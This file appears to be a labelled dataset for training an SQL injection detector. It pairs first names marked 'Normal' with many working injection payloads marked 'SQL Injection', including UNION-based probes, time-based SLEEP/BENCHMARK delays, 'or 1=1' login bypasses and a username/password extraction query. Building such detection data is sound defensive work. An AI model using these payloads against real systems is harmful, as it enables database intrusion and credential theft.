+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+'ORDER BY 25#',SQL Injection
+'AND 7300=7300 AND 'pKlZ'='pKlY',SQL Injection
+'Fran',Normal
+'David',Normal
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
+'Fran',Normal
+"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
+'ORDER BY 13#',SQL Injection
+'Grace',Normal
+'Hank',Normal
+'AND 1=0#',SQL Injection
+'Hank',Normal
+'Alice',Normal
+'WHERE 1=1 AND 1=0#',SQL Injection
+'Jill',Normal
+'Hank',Normal
+'ORDER BY 6',SQL Injection
+'Fran',Normal
+';',SQL Injection
+'ORDER BY 7',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+'Alice',Normal
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
+"'or benchmark(50000000,MD5(1))--'",SQL Injection
+'Charlie',Normal
+'John',Normal
+'David',Normal
+'David',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+'Hank',Normal
+'David',Normal
+'Grace',Normal
+'Bob',Normal
+'Fran',Normal
+'David',Normal
+'Eve',Normal
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'",SQL Injection
+"'"""" or true--'",SQL Injection
+'ORDER BY 24',SQL Injection
+'Alice',Normal
+'Grace',Normal
+'Bob',Normal
+'Eve',Normal
+'Grace',Normal
+'Fran',Normal
+'John',Normal
+'ORDER BY 9#',SQL Injection
+'John',Normal
+'David',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'Hank',Normal
+'Eve',Normal
+'SLEEP(5)#',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'",SQL Injection
+'Eve',Normal
+"'1234 """" AND 1=0 UNION ALL SELECT """"admin"""", """"81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT USER(),SLEEP(5)--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Hank',Normal
+'Eve',Normal
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+'Hank',Normal
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+'Hank',Normal
+'Eve',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'David',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'or 1=1',SQL Injection
+'David',Normal
+'%00',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
+'Bob',Normal
+"'""""));",SQL Injection
+'David',Normal
+'Bob',Normal
+'Grace',Normal
+'WHERE 1=1 AND 1=1--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+'David',Normal
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
+'Bob',Normal
+'ORDER BY 4#',SQL Injection
+'') or ('x')=('x',SQL Injection
+'Charlie',Normal
+'Hank',Normal
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+'pg_SLEEP(5)--',SQL Injection
+'Alice',Normal
+'Eve',Normal
+'ORDER BY 30#',SQL Injection
+'Jill',Normal
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+'ORDER BY 23--',SQL Injection
+'Charlie',Normal
+'Grace',Normal
+'Bob',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
+'Jill',Normal
+'Grace',Normal
+'Hank',Normal
+'';,SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'",SQL Injection
+'Hank',Normal
+'David',Normal
+'Jill',Normal
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+'ORDER BY 20',SQL Injection
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'John',Normal
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
+'John',Normal
+'David',Normal
+"'' UNION SELECT null, username, password FROM users --'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Jill',Normal
+'Charlie',Normal
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#'",SQL Injection
+'Fran',Normal
+'Hank',Normal
+'Hank',Normal
+'David',Normal
+'Jill',Normal
+'Grace',Normal
+'Bob',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+'David',Normal
+'Grace',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+'Fran',Normal
+'Jill',Normal
+'AND 0',SQL Injection
+'Bob',Normal
+'Bob',Normal
+"'"""");",SQL Injection
+'or pg_SLEEP(5)',SQL Injection
+'Hank',Normal
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),""""'3'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--'",SQL Injection
+'Alice',Normal
+'David',Normal
+'ORDER BY 8--',SQL Injection
+"'and (select substring(@@version,3,1))='S''",SQL Injection
+'Grace',Normal
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
+'ORDER BY 22',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+'Eve',Normal
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
+'ORDER BY 30',SQL Injection
+'Jill',Normal
+'Eve',Normal
+'Charlie',Normal
+'Charlie',Normal
+'''',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Charlie',Normal
+'ORDER BY 22',SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
+'Eve',Normal
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
+"'' UNION SELECT 1,2,3 --'",SQL Injection
+'Jill',Normal
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
+'Eve',Normal
+'admin' #',SQL Injection
+'Eve',Normal
+'Bob',Normal
+'John',Normal
+'or 1=1--',SQL Injection
+'Hank',Normal
+'ORDER BY 16--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'",SQL Injection
+'John',Normal
+'Jill',Normal
+'SLEEP(5)--',SQL Injection
+'Jill',Normal
+'Jill',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+'Fran',Normal
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'",SQL Injection
+'Hank',Normal
+'' UNION SELECT sum(columnname ) from tablename --',SQL Injection
+'UNION ALL SELECT USER()--',SQL Injection
+'John',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2'",SQL Injection
+'Grace',Normal
+'Fran',Normal
+'admin' or 1=1/*',SQL Injection
+'Charlie',Normal
+"'admin"""" or 1=1/*'",SQL Injection
+"'UNION ALL SELECT 1,2#'",SQL Injection
+'ORDER BY 17#',SQL Injection
+"'+		addition, concatenate (or space in url)'",SQL Injection
+'David',Normal
+'Eve',Normal
+'David',Normal
+'Hank',Normal
+'David',Normal
+'Alice',Normal
+''-'',SQL Injection
+'Bob',Normal
+'Alice',Normal
+'Charlie',Normal
+"'"""" or """"""""-""""'",SQL Injection
+'John',Normal
+'Alice',Normal
+'John',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'or pg_SLEEP(5)--',SQL Injection
+'Jill',Normal
+'John',Normal
+'Hank',Normal
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'John',Normal
+'Bob',Normal
+'ORDER BY 15--',SQL Injection
+'John',Normal
+'Alice',Normal
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
+'John',Normal
+'ORDER BY 10',SQL Injection
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'ORDER BY 22#',SQL Injection
+'Eve',Normal
+"'admin"""") or (""""1""""=""""1'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+'admin' or '1'='1',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'",SQL Injection
+'Bob',Normal
+'AND 7300=7300 AND 'pKlZ'='pKlY',SQL Injection
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'",SQL Injection
+'ORDER BY SLEEP(5)--',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
+"'""""'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+"'admin"""") or """"1""""=""""1'",SQL Injection
+'Charlie',Normal
+'David',Normal
+'Charlie',Normal
+'Fran',Normal
+"'-1 UNION SELECT 1 INTO @,@'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'",SQL Injection
+'Charlie',Normal
+'Grace',Normal
+"'+benchmark(3200,SHA1(1))+''",SQL Injection
+"'admin"""" --'",SQL Injection
+'ORDER BY 23',SQL Injection
+"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
+'AND 0',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+''',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8'",SQL Injection
+'Alice',Normal
+'John',Normal
+'Charlie',Normal
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--'",SQL Injection
+'#	    Hash comment',SQL Injection
+'Fran',Normal
+'' or sleep(5)='',SQL Injection
+'David',Normal
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Eve',Normal
+'Hank',Normal
+'Jill',Normal
+'Fran',Normal
+''));,SQL Injection
+'Eve',Normal
+'' AND id IS NULL; --',SQL Injection
+'Alice',Normal
+'Charlie',Normal
+'Hank',Normal
+'Charlie',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8--'",SQL Injection
+'John',Normal
+'Eve',Normal
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'",SQL Injection
+'Jill',Normal
+'Grace',Normal
+'Bob',Normal
+'Bob',Normal
+'Charlie',Normal
+'Alice',Normal
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--'",SQL Injection
+'SLEEP(5)='',SQL Injection
+'Alice',Normal
+'Hank',Normal
+'ORDER BY 31337--',SQL Injection
+'# from wapiti',SQL Injection
+'Jill',Normal
+'pg_sleep(5)--',SQL Injection
+'David',Normal
+'pg_SLEEP(5)',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
+'David',Normal
+'Charlie',Normal
+'David',Normal
+'Hank',Normal
+'Bob',Normal
+'Eve',Normal
+'Fran',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5)'",SQL Injection
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),3'",SQL Injection
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6--'",SQL Injection
+'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --',SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
+'Grace',Normal
+'John',Normal
+'David',Normal
+'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
+''^'',SQL Injection
+'Jill',Normal
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10'",SQL Injection
+'Charlie',Normal
+'ORDER BY 6#',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11'",SQL Injection
+'Jill',Normal
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
+'Eve',Normal
+'Fran',Normal
+'Grace',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8'",SQL Injection
+'Alice',Normal
+'David',Normal
+'Fran',Normal
+'' or sleep(5)='',SQL Injection
+'Eve',Normal
+'Fran',Normal
+'Grace',Normal
+'Grace',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'",SQL Injection
+'Fran',Normal
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'John',Normal
+'AND 7300=7300 AND 'pKlZ'='pKlZ',SQL Injection
+'Fran',Normal
+'ORDER BY 7',SQL Injection
+'' '',SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'UNION ALL SELECT 1',SQL Injection
+'WHERE 1=1 AND 1=0#',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
+'AND 1=1',SQL Injection
+"'1 or benchmark(10000000,MD5(1))#'",SQL Injection
+'Bob',Normal
+'ORDER BY 9#',SQL Injection
+'Alice',Normal
+'David',Normal
+'Charlie',Normal
+'Fran',Normal
+'John',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Hank',Normal
+'`',SQL Injection
+'Hank',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'John',Normal
+'Bob',Normal
+'John',Normal
+'admin') or ('1'='1'--',SQL Injection
+'Fran',Normal
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'WHERE 1=1 AND 1=1--',SQL Injection
+'Grace',Normal
+'Charlie',Normal
+'Fran',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--'",SQL Injection
+'Fran',Normal
+'David',Normal
+'ORDER BY 5#',SQL Injection
+"'"""") or true--'",SQL Injection
+"'"""") or (""""x"""")=(""""x'",SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
+'Grace',Normal
+'Eve',Normal
+'1 or sleep(5)#',SQL Injection
+'Charlie',Normal
+'Eve',Normal
+'Fran',Normal
+'Hank',Normal
+'Alice',Normal
+'Fran',Normal
+'Fran',Normal
+'David',Normal
+'Grace',Normal
+'John',Normal
+'Fran',Normal
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'",SQL Injection
+'') or ('x')=('x',SQL Injection
+'Alice',Normal
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+"'benchmark(50000000,MD5(1))#'",SQL Injection
+'Hank',Normal
+'Eve',Normal
+'Jill',Normal
+'Alice',Normal
+'Alice',Normal
+'OR 1=1--',SQL Injection
+'Grace',Normal
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3'",SQL Injection
+'Charlie',Normal
+'UNION ALL SELECT 1',SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'",SQL Injection
+'Charlie',Normal
+'David',Normal
+'Charlie',Normal
+'Grace',Normal
+'David',Normal
+'Grace',Normal
+'@@variable	global variable',SQL Injection
+'Eve',Normal
+'David',Normal
+'Eve',Normal
+'Hank',Normal
+'Alice',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
+'Charlie',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
+'Grace',Normal
+'David',Normal
+'David',Normal
+'Grace',Normal
+'Grace',Normal
+'/*  	C-style comment',SQL Injection
+'David',Normal
+'John',Normal
+'Jill',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
+'Jill',Normal
+'AND 1=1',SQL Injection
+'Bob',Normal
+'John',Normal
+'Eve',Normal
+'Grace',Normal
+'Grace',Normal
+'Bob',Normal
+'Fran',Normal
+'Fran',Normal
+'Eve',Normal
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7'",SQL Injection
+'Jill',Normal
+'Eve',Normal
+'Alice',Normal
+'David',Normal
+'Grace',Normal
+'Alice',Normal
+'Charlie',Normal
+'Eve',Normal
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'",SQL Injection
+'Eve',Normal
+'Eve',Normal
+'Jill',Normal
+'John',Normal
+'John',Normal
+''^'',SQL Injection
+'OR 1=0',SQL Injection
+'Hank',Normal
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+'Grace',Normal
+'Fran',Normal
+'Grace',Normal
+'Alice',Normal
+'Charlie',Normal
+'David',Normal
+'# Numeric',SQL Injection
+'Bob',Normal
+'Hank',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#'",SQL Injection
